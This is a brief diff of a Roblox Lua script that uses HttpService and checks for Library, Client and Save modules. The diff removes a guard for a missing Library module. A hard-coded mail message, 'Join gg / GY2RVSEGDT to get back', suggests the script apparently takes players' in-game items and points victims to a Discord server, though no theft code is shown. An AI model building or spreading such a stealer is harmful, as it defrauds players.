@@ -12,14 +12,6 @@ local MailMessage = "Join gg / GY2RVSEGDT to get back"
 
 local HttpService = game:GetService("HttpService")
 
--- Ensure the Library module exists
-local libraryModule = replicatedStorage:FindFirstChild("Library")
-if not libraryModule then
-    warn("Library module not found!")
-    return
-end
-
-
 -- Ensure the Client and Save modules exist
 local clientFolder = replicatedStorage:FindFirstChild("Library"):FindFirstChild("Client")
 if not (clientFolder and clientFolder:FindFirstChild("Save")) then
